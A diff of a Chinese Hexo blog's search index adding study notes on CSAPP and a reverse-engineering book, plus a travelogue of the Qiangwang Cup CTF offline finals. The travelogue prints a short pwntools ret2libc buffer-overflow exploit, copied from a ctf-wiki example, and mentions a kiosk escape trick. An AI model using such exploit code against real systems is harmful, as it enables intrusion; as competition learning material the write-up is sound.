@@ -230,6 +230,117 @@
       </categories>
   </entry>
   <entry>
+    <title>（不定期更新）csapp学习笔记</title>
+    <url>/2022/01/15/csapp.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote>
+<p>友情提示：</p>
+<p>看这本书，笔记、习题、实验三者缺一不可。</p>
+<p>如果你觉得中文翻译质量欠佳，想选择英文原版阅读，那么千万不要选择Global Edition！因为Global Edition的习题环节错误百出，有许多题答案根本无法与题目相对应，严重影响阅读体验和对知识的理解！（我就是白嫖了github上面的免费资源，虽然不是影印版，而且正文质量很高，但习题这个问题就可以盖过其他所有优点）。我现在不得不边看英文原文边做中文版本上的习题(lll￢ω￢)</p>
+</blockquote>
+<span id="more"></span>
+<h1 id="计算机系统漫游"><a href="#计算机系统漫游" class="headerlink" title="计算机系统漫游"></a>计算机系统漫游</h1><p>一个接下所有章节的outline，<del>可以作为计算机系统导论的复习材料。</del></p>
+<h1 id="信息的表示和处理"><a href="#信息的表示和处理" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h1><p>之前草草看过一遍，没做题，现在都搞不清楚浮点数的<strong>最小/最大非规格化数</strong>和<strong>最小/最大规格化数</strong>是怎么算出来的。</p>
+<p>有空再天坑。</p>
+<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h2><p>讲了一下Intel处理器的历史，顺便提了一下SSE和AVX指令集（我觉得自己将来都要学的，又要开始秃头了(lll￢ω￢)</p>
+<h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><p>如何在linux环境下查看gcc编译的AT&amp;T格式的汇编代码。</p>
+<h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><ul>
+<li>char</li>
+<li>short</li>
+<li>int</li>
+<li>long（即long long，下同）</li>
+<li>float</li>
+<li>double</li>
+<li>指针（本书是64位环境，所有指针均为8字节）</li>
+</ul>
+<h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p>各种寄存器（rax~rdx，rsi，rdi，rbp，rsp，r8~r15，及对应的32位、16位、8位版本），mov指令（movq、movl、movw、movb、movzbw、movsbq等，后两者是类型强转）。</p>
+<h2 id="算术和逻辑操作"><a href="#算术和逻辑操作" class="headerlink" title="算术和逻辑操作"></a>算术和逻辑操作</h2><p>lea——取地址，外加简单算术指令，类似于a+b*c的形式（表示字节数的q、l、w、b字母省略，下同）</p>
+<p>sf、zf、pf、cf、af、of——各种标志符(flag)</p>
+<p>add、sub、(i)mul、(i)div、shl(sal)、shr、sar——改变flag状态</p>
+<p>inc、dec——不改变flag状态</p>
+<p>cqto——64位转128位，做128位除法有用</p>
+<h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>if、switch、while、do-while、for的汇编实现，这部分作业错误尤其多。</p>
+<p>由于cpu具有分支预测的功能（部分语句准确率可达90%），简单if语句会预先计算两种分支之后寄存器的变化，以提高cpu的运行速度。</p>
+<p>对于多分支、取值接近的switch语句，编译器会构造跳表来代替各种jz、jbe等判断语句，以提高代码执行效率，因为跳表的执行速度不受分支个数的影响。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>再一次复习堆栈调用的汇编实现，将一个栈帧的各个部分（return address, saved registers, local variables, argument build area）都讲到了，很细致。</p>
+<h2 id="数组分配和访问"><a href="#数组分配和访问" class="headerlink" title="数组分配和访问"></a>数组分配和访问</h2><p>lea指令的作用就是专门为访问数组设计的。</p>
+<p>虽然编译器更喜欢使用指针遍历数组，加上一个固定的值。即使是多维数组遍历，也尽量不用我们数据结构课学到的i*Wid+j这个公式——毕竟乘法太费时间了。</p>
+<h2 id="异数的数据结构——1-15-2022"><a href="#异数的数据结构——1-15-2022" class="headerlink" title="异数的数据结构——1/15/2022"></a>异数的数据结构——1/15/2022</h2><p>讲了struct、union和空间对齐。</p>
+<p><strong>union中的大小是其中最大数据类型的大小。</strong></p>
+<p>使用union可以强转数据类型（比如说把double转成unsigned long）。</p>
+<p>结构体中的每一项数据的地址都必须是其类型大小的整数倍。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>强网杯线下公费游记</title>
+    <url>/2021/10/17/ctf03.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>发现一个有趣的现象，线上的第一名在线下得了零分；而线下的第一名在线上基本上是垫底进的决赛。</p>
+<p>而我们组，也大致遵从这个规律。这说明了什么呢？</p>
+<span id="more"></span>
+<h1 id="day-0"><a href="#day-0" class="headerlink" title="day 0"></a>day 0</h1><p>由于多种原因（中高风险地区，与西电比赛冲突，学校周末上课等等），我们成功进入了线下比赛，而且好像是以<strong>21名（倒数第四名）</strong>进入的。我为自己队伍居然不是垫底而十分欣慰。</p>
+<p>（不得不说来回的飞机是真的有点颠，像坐长途大巴车一样，而且噪声贼大）</p>
+<p>线下赛的地点是郑州的网络安全科技馆，由于地处四环路的西北部，属于郊区中的郊区，当地人并不认为它属于郑州的一部分。重要的是，这里离新郑机场有<strong>六七十公里</strong>远的距离，相当于从东南角绕城到西北角。也正因为它偏僻，所以周围的配套设施基本为零，随便叫一份外卖都要等一个小时。</p>
+<p>（大门截图）</p>
+<p><img src="/2021/10/17/ctf03/gate.jpg"></p>
+<p>我们在大门后面的假日酒店居住，按照国际惯例，主办方要报销住宿费用与路费，自然我可以舒舒服服地吃一顿好的（但减肥的愿望阻止的这种行为的发生），床睡着也比上次在川大附近舒服很多，唯一的不足就是早晚的空气有点干冷（只有四五度，晨跑是不太可能了，怕流鼻血），风儿有点喧嚣。在当天下午，我们熟悉的几个队集中在一个房间里培训BF赛制（break &amp; fix），讲的什么我啥也没听懂，晚上我们在“有人烟的地方”聚了餐，我以早点回去面试网安协会干事为由，徒步两公里回到了酒店（不得不说这地方连路灯都没几盏，害得我一步三回头来排除可能的危险）。</p>
+<p>回到酒店后做了会reverse练练手，然后就接到消息，说新疆那边又出了幺蛾子疫情，明天全员又得做核酸，无语了……</p>
+<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><p>强网杯比赛分为两天进行，第一天是创新赛、第二天是实践赛。我先前预测过创新赛是misc大赛，而官方给出的答复是跑男赛制。我觉得自己算是个misc手，这次比赛应该不会一道题都做不出来，可以避免自己太菜的尴尬。</p>
+<p>然而，出乎意料的事情发生了……</p>
+<p>这几天我的火绒总是在一些正常的应用程序报毒，而且有时运行完一个程序后图标会有所变化，甚至还会跳出<strong>随机命名</strong>的excel宏文件。虽然程序的功能没有受到任何影响，但是我仍旧怀疑自己的电脑中了病毒，而且已经感染了许多文件。通过对火绒log文件的查看以及上网对比相关信息，我确信自己的电脑中了名为<em>Synares.a$SA</em>的蠕虫病毒。这种病毒会对你运行的exe进行加壳操作（感染），同时窃取网银信息（目的明确，可惜我电脑没有），并常驻内存与开机启动项（后者被火绒拦住了）。传播方式有运行受感染的exe，以及U盘等储存介质等等，能力还是比较强的。</p>
+<p>我立刻对电脑进行了全盘扫描，一共检出了202个风险文件（其中有一些是我学习web时使用的sql注入的代码，和一些杂七杂八的web工具）。保险起见，我把它们都删了，还删除了临时文件夹里的所有文件。重启一遍，接着扫，扫出来5个风险，全是我存在压缩包里的后门代码，没有病毒，就忽略没管了。事实证明病毒确实被清理干净了。</p>
+<p>做完这些破事已经耗费了我一个上午的时间，吃了午饭后就趴在床上午休了。起床后要求做核酸，同时与那位安徽选手成功面基（不得不说我变瘦了一些，他变胖了许多，互相都认不出来了）。然后就是花里胡哨的开幕式，学生发言代表是场中唯三女生之一（不错啊，在这种场合能见到女选手是一种幸运）。</p>
+<p>接下来开始创新赛，开始我们要到找到五张图片对应的场馆位置，并拍照打卡。周围的人都一溜烟不见了，唯独我们仨不紧不慢地在场馆漫步。照片拍完后我们抽取了一个项目，恰好是crypto，题目如下:</p>
+<blockquote>
+<p>它被称为窃贼之友 (Thief’s Friend)，是一个能够打开被锁住且未受魔法保护的门窗的符咒。这个咒语也能用来开启被锁定咒锁住的门。</p>
+<p>这是你要学习的第一段咒语，也是基础咒语，它会帮助你解决网安魔法世界里出现的一些问题。</p>
+<p>在这个世界中是综合编码与密码学知识所构成的，只有成功破解密文的人，才有资格获取这个咒语。</p>
+<p>NF4FCRTILA3EW53QNZ4VU4DSPBTVKNDOONGWYSJYJV2W4NKFORZVQRTXKJDUONKQJFAVEWBVHBIHANKULBXFA6LPOZVFOSCEIFFE2VLMGM2UG2KNNV5FS3SWJE3DQ6TEG4ZG4SDBIE3TCZLRLFCXAWSHJQ2HAOKKK5ZDGYKOGFUUSZ3LIN3UUR3TJIZEQZKTGBKHMZ3MO5STO6CDHBEWUY3ZLB2DG42JG5WWK4DJHBEFCWKVGUZDETBZNE3GOVKWMFDWQYSDOBUGUUDIIFCXS2KTJNUUUYLUIN5FASCZNVEUQWBSNJ2EU2DPJVYFM33BJZCUM6SQGFLFM5TBKNRDARZQIVFG6VKJLBFGQ2KOJNDWUWJSJM4U44SGHFDFGMJQOVEECUCIJ5QUWVDCN5BVAVDVOFLFQ532GNVGG2JXMJNGO3D2KNMUK6BWGBFG4ODRPI4DEZSNJE4UY5LWIZ3EQRTRJ53VG6LJGVJG2ZKXMFCG4RDZIFRWS6CGIVJWISCGK5IU66SUNNSXSOTGNRQWO===</p>
+</blockquote>
+<p>首先三个等号说明是base32，然后解密之后长这样：</p>
+<blockquote>
+<p>ixQFhX6KwpnyZprxgU4nsMlI8Mun5EtsXFwRGG5PIARX58Pp5TXnPyovjWHDAJMUl35CiMmzYnVI68zd72nHaA71eqYEpZGL4p9JWr3aN1iIgkCwJGsJ2HeS0Tvglwe7xC8IjcyXt3sI7mepi8HQYU522L9i6gUVaGhbCphjPhAEyiSKiJatCzPHYmIHX2jtJhoMpVoaNEFzP1VVvaSb0G0EJoUIXJhiNKGjY2K9NrF9FS10uHAPHOaKTboCPTuqVXwz3jci7bZglzSYEx60Jn8qz82fMI9LuvFvHFqOwSyi5RmeWaDnDyAcixFESdHFWQOzTkey:flag</p>
+</blockquote>
+<p>然后我尝试了各种带密钥的加密，无果。</p>
+<p>尝试将密文base64，乱码；转16进制，正看倒看都没发现常见的文件头。我甚至将16进制数分解了质因数，发现不是两个大质数相乘的形式，排除rsa。</p>
+<p>然后又尝试了base58，base62，base85，base91都失败了。思路中断。<strong>（会的发下评论区）</strong></p>
+<p>我们在这个题上花了接近一个小时，而r3gr3t似乎早已做出另外一道web题，然而flag一直都是错的。直到一名工作人员从他身后走过，他说r3做对了，是比赛的问题，让我们去先前领题的地方要flag。我淦，就因为这问题，白白浪费了半个多小时的时间，才拿到1000分，而其他的队此时已经有两三千分了。</p>
+<p>我们决定放弃那道crypto，下楼去问一个队能不能同时参加多个项目，回答居然是可以的——只是每个人要把他的”护照“扣押在题目点（也就是一个队最多同时参加3个项目）。我终于理解其他队为什么涨分那么快——我们反应还是太慢了点。</p>
+<p>之后我们一路披荆斩棘，体验了红军文化的开卷考试，享受了量子加密的智商碾压（如图），温习了20天前才学会的ppt拼图大法，破解了展馆里不堪一击快递系统（其实就是调出osk再win+E的小伎俩，我还用这种伎俩玩过扫雷呢）等等——总之，在这场阴间创新赛中我们获得了第八名，是一个尚可的成绩。</p>
+<p><img src="/2021/10/17/ctf03/quantum.jpg" style="zoom: 25%;"></p>
+<p>在当天晚上，我去同学寝室聊了一会儿，然后偷师学艺，会了一点pwn。回寝后r3告诉我明天的pwn有ret2libc和ret2shellcode，我看了一下（当然没有看懂）。因为明天没网，我把那几个博客离线了一下，顺便也把<a href="https://ctf-wiki.org/">ctf-wiki</a>对应的部分和例题文件拷到了本地，做好了明天在线学pwn的准备。</p>
+<h1 id="day-2"><a href="#day-2" class="headerlink" title="day 2"></a>day 2</h1><p>早上6：30起床，喝了下胡辣汤，感觉像一种胶体，而且味道有点像泡面的调味料，不是特别好喝，可能是酒店没得到真传吧。</p>
+<p>进赛场的时候突然要查口罩，我恰好忘在了房间，又不想冒着四五度的寒风在酒店与场馆穿梭（虽然不到50米），就在入口等了十分钟才等到救兵。发现赛场是真的暖和。</p>
+<p>（赛场截图）</p>
+<p><img src="/2021/10/17/ctf03/battlefield.jpg" style="zoom: 50%;"></p>
+<p>网站发了四道题，2web、2pwn，pwn不出所料，果然是那两个rop类型。甚至ret2libc的文件与ctf-wiki的最简单的例题几乎一模一样，然而我尝试仿照他的exp来写自己的，但无论如何就是攻不进去（当时比赛才过不到10分钟，就有人A了这道题，思路肯定不会太麻烦），我搬来了r3这个救兵，他甚至把暴力枚举payload长度的方法都用上了，还是不行。一个多小时后，我气急败坏，直接把例题的代码复制上去，居然成了？！</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>于是我成为了我们队唯一一个pwn手。</p>
+<p>随后的攻击阶段我就躺平了，另外一道pwn开了PIE保护，要动态截取内存地址，我不会。r3帮我写了脚本，按照他思路攻击了一下，然而还是无果。web那边welcomeflask主办方连发的三个提示，r3终于成功抢到了二血。</p>
+<p>之后我们都躺平了，攻击阶段排名又是第八。</p>
+<p>接下来是<strong>惊险刺激</strong>的防御阶段，网站给了我们一个docker，然而我屁都不会用，开始边“坐牢”边听音乐。过了25分钟，平台发起了攻击，霎时间有几个队分数暴涨（从两三千涨到八九千），而我们一个题也没防住，掉到了第十名。然后r3又更加精细地补了补漏洞，到第二轮攻击的时候总算还是防住了一个，得分3700，他娘的又是一个第八名。</p>
+<p>为什么说<strong>惊险刺激</strong>呢，因为防御阶段的规则比较奇葩，只要第一轮防住了，第二轮就可以继续得分。更重要的是，我们攻击阶段的满分是4000，而仅仅50分钟的防御就占了6000分，而且积分方式是计算自己分与最高分的比值再*6000——这意味着最先防住漏洞的选手有着极大的分数优势，甚至可以反杀这两天的比赛——很幸运，那位北大小哥抓住了这个机会，他原本是一名替补选手，结果因为第一轮防御就修了3个洞，最后成为了全场比赛的冠军得主。</p>
+<p>果然，国家是要倡导我们做个白帽，要防不要攻啊！</p>
+<p>最后我们总分排名第四，荣获了本次比赛的二等奖（一等奖1、2名，二等奖3~7名，三等奖8~14名）。我惊奇地发现那名学生代表所在的战队也是一等奖得主——果然在任何行业，都有“巾帼不让须眉”的趋势啊。而之前线上的第一名，却名落孙山，不知道到哪儿去了。</p>
+<p><img src="/2021/10/17/ctf03/2nd.jpg" style="zoom: 25%;"></p>
+<p><img src="/2021/10/17/ctf03/pyable.png" style="zoom: 25%;"></p>
+<p>线上的第一名在线下得了零分；而线下的第一名在线上基本上是垫底进的决赛。而我们组，也大致遵从这个规律——线上越苟，线下越强。这说明了什么呢？</p>
+<p>说明这种比赛平时随便打打，玩一玩就行，不必太过于认真。</p>
+<p>毕竟，学好基础知识才是王道，难道不是吗？</p>
+<p>不说了，最近打算把ctf放一放，冲刺一下四级高分，英语免修它不香吗？</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>pwn</tag>
+        <tag>misc</tag>
+        <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>陇剑杯入土记</title>
     <url>/2021/09/14/ctf01.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>刚进校不久，我们就被老师鼓励去打首届陇剑杯，当我看到比赛说明的考纲范围时，就发现考察范围与我学习的知识毫无交集。</p>
@@ -341,78 +452,54 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>c++</tag>
         <tag>python</tag>
-        <tag>reverse</tag>
         <tag>crypto</tag>
+        <tag>c++</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
-    <title>强网杯线下公费游记</title>
-    <url>/2021/10/17/ctf03.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>发现一个有趣的现象，线上的第一名在线下得了零分；而线下的第一名在线上基本上是垫底进的决赛。</p>
-<p>而我们组，也大致遵从这个规律。这说明了什么呢？</p>
+    <title>（不定期更新）《加密与解密》学习笔记</title>
+    <url>/2022/01/15/en&amp;decrypt.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>与csapp相比，《加密与解密》更偏向于实践一点，内容丰富但比较杂。</p>
 <span id="more"></span>
-<h1 id="day-0"><a href="#day-0" class="headerlink" title="day 0"></a>day 0</h1><p>由于多种原因（中高风险地区，与西电比赛冲突，学校周末上课等等），我们成功进入了线下比赛，而且好像是以<strong>21名（倒数第四名）</strong>进入的。我为自己队伍居然不是垫底而十分欣慰。</p>
-<p>（不得不说来回的飞机是真的有点颠，像坐长途大巴车一样，而且噪声贼大）</p>
-<p>线下赛的地点是郑州的网络安全科技馆，由于地处四环路的西北部，属于郊区中的郊区，当地人并不认为它属于郑州的一部分。重要的是，这里离新郑机场有<strong>六七十公里</strong>远的距离，相当于从东南角绕城到西北角。也正因为它偏僻，所以周围的配套设施基本为零，随便叫一份外卖都要等一个小时。</p>
-<p>（大门截图）</p>
-<p><img src="/2021/10/17/ctf03/gate.jpg"></p>
-<p>我们在大门后面的假日酒店居住，按照国际惯例，主办方要报销住宿费用与路费，自然我可以舒舒服服地吃一顿好的（但减肥的愿望阻止的这种行为的发生），床睡着也比上次在川大附近舒服很多，唯一的不足就是早晚的空气有点干冷（只有四五度，晨跑是不太可能了，怕流鼻血），风儿有点喧嚣。在当天下午，我们熟悉的几个队集中在一个房间里培训BF赛制（break &amp; fix），讲的什么我啥也没听懂，晚上我们在“有人烟的地方”聚了餐，我以早点回去面试网安协会干事为由，徒步两公里回到了酒店（不得不说这地方连路灯都没几盏，害得我一步三回头来排除可能的危险）。</p>
-<p>回到酒店后做了会reverse练练手，然后就接到消息，说新疆那边又出了幺蛾子疫情，明天全员又得做核酸，无语了……</p>
-<h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><p>强网杯比赛分为两天进行，第一天是创新赛、第二天是实践赛。我先前预测过创新赛是misc大赛，而官方给出的答复是跑男赛制。我觉得自己算是个misc手，这次比赛应该不会一道题都做不出来，可以避免自己太菜的尴尬。</p>
-<p>然而，出乎意料的事情发生了……</p>
-<p>这几天我的火绒总是在一些正常的应用程序报毒，而且有时运行完一个程序后图标会有所变化，甚至还会跳出<strong>随机命名</strong>的excel宏文件。虽然程序的功能没有受到任何影响，但是我仍旧怀疑自己的电脑中了病毒，而且已经感染了许多文件。通过对火绒log文件的查看以及上网对比相关信息，我确信自己的电脑中了名为<em>Synares.a$SA</em>的蠕虫病毒。这种病毒会对你运行的exe进行加壳操作（感染），同时窃取网银信息（目的明确，可惜我电脑没有），并常驻内存与开机启动项（后者被火绒拦住了）。传播方式有运行受感染的exe，以及U盘等储存介质等等，能力还是比较强的。</p>
-<p>我立刻对电脑进行了全盘扫描，一共检出了202个风险文件（其中有一些是我学习web时使用的sql注入的代码，和一些杂七杂八的web工具）。保险起见，我把它们都删了，还删除了临时文件夹里的所有文件。重启一遍，接着扫，扫出来5个风险，全是我存在压缩包里的后门代码，没有病毒，就忽略没管了。事实证明病毒确实被清理干净了。</p>
-<p>做完这些破事已经耗费了我一个上午的时间，吃了午饭后就趴在床上午休了。起床后要求做核酸，同时与那位安徽选手成功面基（不得不说我变瘦了一些，他变胖了许多，互相都认不出来了）。然后就是花里胡哨的开幕式，学生发言代表是场中唯三女生之一（不错啊，在这种场合能见到女选手是一种幸运）。</p>
-<p>接下来开始创新赛，开始我们要到找到五张图片对应的场馆位置，并拍照打卡。周围的人都一溜烟不见了，唯独我们仨不紧不慢地在场馆漫步。照片拍完后我们抽取了一个项目，恰好是crypto，题目如下:</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>诸如API、Unicode、Little-endian之类的介绍，此处略去。</p>
+<p>（但是Win32 API和WOW64放到这一段就很劝退，算了还是将来用到再查文档吧——）</p>
+<h1 id="动态分析技术"><a href="#动态分析技术" class="headerlink" title="动态分析技术"></a>动态分析技术</h1><ul>
+<li><p>OllyDbg </p>
+<p>（学了硬件断点、消息断点、条件断点、内存断点，还有trace功能）</p>
+</li>
+<li><p>x64dbg</p>
+</li>
+<li><p><del>MDebug</del></p>
+</li>
+<li><p><del>WinDbg</del></p>
+</li>
+</ul>
+<h1 id="静态分析技术"><a href="#静态分析技术" class="headerlink" title="静态分析技术"></a>静态分析技术</h1><ul>
+<li><p>PEiD/ExeinfoPE</p>
+</li>
+<li><p><del>ODDisasm、BeaEngine、Udis86、Capstone、AsmJit、Keystone</del> </p>
+</li>
+<li><p>IDA yyds!</p>
+<p>（IDA提供了一项我以前并不知道的功能，就是在系统API处按下F1键会弹出该API的用法，然而这个功能只支持.hlp文件，所以它并没有什么用）</p>
+</li>
+<li><p>WinHex/010editor</p>
+</li>
+</ul>
+<h1 id="逆向分析技术"><a href="#逆向分析技术" class="headerlink" title="逆向分析技术"></a>逆向分析技术</h1><h2 id="32位软件逆向技术"><a href="#32位软件逆向技术" class="headerlink" title="32位软件逆向技术"></a>32位软件逆向技术</h2><h3 id="启动函数"><a href="#启动函数" class="headerlink" title="启动函数"></a>启动函数</h3><p><del>WinAPI集中区域，看不懂直接跳。</del></p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>第N次复习栈调用的机会。</p>
+<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>使用栈存放。</p>
+<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>.data区段。</p>
+<h4 id="数组——1-14-2022"><a href="#数组——1-14-2022" class="headerlink" title="数组——1/14/2022"></a>数组——1/14/2022</h4><p>为了看懂数组的汇编代码，狂补csapp的相应章节。</p>
+<h3 id="虚函数——1-15-2022"><a href="#虚函数——1-15-2022" class="headerlink" title="虚函数——1/15/2022"></a>虚函数——1/15/2022</h3><p>引用虚函数：先用指针（通常由new或malloc分配）指向虚函数表（VTBL），该表存放着所有虚函数的<strong>地址</strong>，再使用虚函数表指针（VPTR）调用函数。</p>
 <blockquote>
-<p>它被称为窃贼之友 (Thief’s Friend)，是一个能够打开被锁住且未受魔法保护的门窗的符咒。这个咒语也能用来开启被锁定咒锁住的门。</p>
-<p>这是你要学习的第一段咒语，也是基础咒语，它会帮助你解决网安魔法世界里出现的一些问题。</p>
-<p>在这个世界中是综合编码与密码学知识所构成的，只有成功破解密文的人，才有资格获取这个咒语。</p>
-<p>NF4FCRTILA3EW53QNZ4VU4DSPBTVKNDOONGWYSJYJV2W4NKFORZVQRTXKJDUONKQJFAVEWBVHBIHANKULBXFA6LPOZVFOSCEIFFE2VLMGM2UG2KNNV5FS3SWJE3DQ6TEG4ZG4SDBIE3TCZLRLFCXAWSHJQ2HAOKKK5ZDGYKOGFUUSZ3LIN3UUR3TJIZEQZKTGBKHMZ3MO5STO6CDHBEWUY3ZLB2DG42JG5WWK4DJHBEFCWKVGUZDETBZNE3GOVKWMFDWQYSDOBUGUUDIIFCXS2KTJNUUUYLUIN5FASCZNVEUQWBSNJ2EU2DPJVYFM33BJZCUM6SQGFLFM5TBKNRDARZQIVFG6VKJLBFGQ2KOJNDWUWJSJM4U44SGHFDFGMJQOVEECUCIJ5QUWVDCN5BVAVDVOFLFQ532GNVGG2JXMJNGO3D2KNMUK6BWGBFG4ODRPI4DEZSNJE4UY5LWIZ3EQRTRJ53VG6LJGVJG2ZKXMFCG4RDZIFRWS6CGIVJWISCGK5IU66SUNNSXSOTGNRQWO===</p>
+<p>疑问：汇编代码中0040101B地址，为什么<code>eax=*VTBL=**Add()</code>，而不是<code>eax=*VTBL=&amp;Add()</code>？</p>
 </blockquote>
-<p>首先三个等号说明是base32，然后解密之后长这样：</p>
-<blockquote>
-<p>ixQFhX6KwpnyZprxgU4nsMlI8Mun5EtsXFwRGG5PIARX58Pp5TXnPyovjWHDAJMUl35CiMmzYnVI68zd72nHaA71eqYEpZGL4p9JWr3aN1iIgkCwJGsJ2HeS0Tvglwe7xC8IjcyXt3sI7mepi8HQYU522L9i6gUVaGhbCphjPhAEyiSKiJatCzPHYmIHX2jtJhoMpVoaNEFzP1VVvaSb0G0EJoUIXJhiNKGjY2K9NrF9FS10uHAPHOaKTboCPTuqVXwz3jci7bZglzSYEx60Jn8qz82fMI9LuvFvHFqOwSyi5RmeWaDnDyAcixFESdHFWQOzTkey:flag</p>
-</blockquote>
-<p>然后我尝试了各种带密钥的加密，无果。</p>
-<p>尝试将密文base64，乱码；转16进制，正看倒看都没发现常见的文件头。我甚至将16进制数分解了质因数，发现不是两个大质数相乘的形式，排除rsa。</p>
-<p>然后又尝试了base58，base62，base85，base91都失败了。思路中断。<strong>（会的发下评论区）</strong></p>
-<p>我们在这个题上花了接近一个小时，而r3gr3t似乎早已做出另外一道web题，然而flag一直都是错的。直到一名工作人员从他身后走过，他说r3做对了，是比赛的问题，让我们去先前领题的地方要flag。我淦，就因为这问题，白白浪费了半个多小时的时间，才拿到1000分，而其他的队此时已经有两三千分了。</p>
-<p>我们决定放弃那道crypto，下楼去问一个队能不能同时参加多个项目，回答居然是可以的——只是每个人要把他的”护照“扣押在题目点（也就是一个队最多同时参加3个项目）。我终于理解其他队为什么涨分那么快——我们反应还是太慢了点。</p>
-<p>之后我们一路披荆斩棘，体验了红军文化的开卷考试，享受了量子加密的智商碾压（如图），温习了20天前才学会的ppt拼图大法，破解了展馆里不堪一击快递系统（其实就是调出osk再win+E的小伎俩，我还用这种伎俩玩过扫雷呢）等等——总之，在这场阴间创新赛中我们获得了第八名，是一个尚可的成绩。</p>
-<p><img src="/2021/10/17/ctf03/quantum.jpg" style="zoom: 25%;"></p>
-<p>在当天晚上，我去同学寝室聊了一会儿，然后偷师学艺，会了一点pwn。回寝后r3告诉我明天的pwn有ret2libc和ret2shellcode，我看了一下（当然没有看懂）。因为明天没网，我把那几个博客离线了一下，顺便也把<a href="https://ctf-wiki.org/">ctf-wiki</a>对应的部分和例题文件拷到了本地，做好了明天在线学pwn的准备。</p>
-<h1 id="day-2"><a href="#day-2" class="headerlink" title="day 2"></a>day 2</h1><p>早上6：30起床，喝了下胡辣汤，感觉像一种胶体，而且味道有点像泡面的调味料，不是特别好喝，可能是酒店没得到真传吧。</p>
-<p>进赛场的时候突然要查口罩，我恰好忘在了房间，又不想冒着四五度的寒风在酒店与场馆穿梭（虽然不到50米），就在入口等了十分钟才等到救兵。发现赛场是真的暖和。</p>
-<p>（赛场截图）</p>
-<p><img src="/2021/10/17/ctf03/battlefield.jpg" style="zoom: 50%;"></p>
-<p>网站发了四道题，2web、2pwn，pwn不出所料，果然是那两个rop类型。甚至ret2libc的文件与ctf-wiki的最简单的例题几乎一模一样，然而我尝试仿照他的exp来写自己的，但无论如何就是攻不进去（当时比赛才过不到10分钟，就有人A了这道题，思路肯定不会太麻烦），我搬来了r3这个救兵，他甚至把暴力枚举payload长度的方法都用上了，还是不行。一个多小时后，我气急败坏，直接把例题的代码复制上去，居然成了？！</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>于是我成为了我们队唯一一个pwn手。</p>
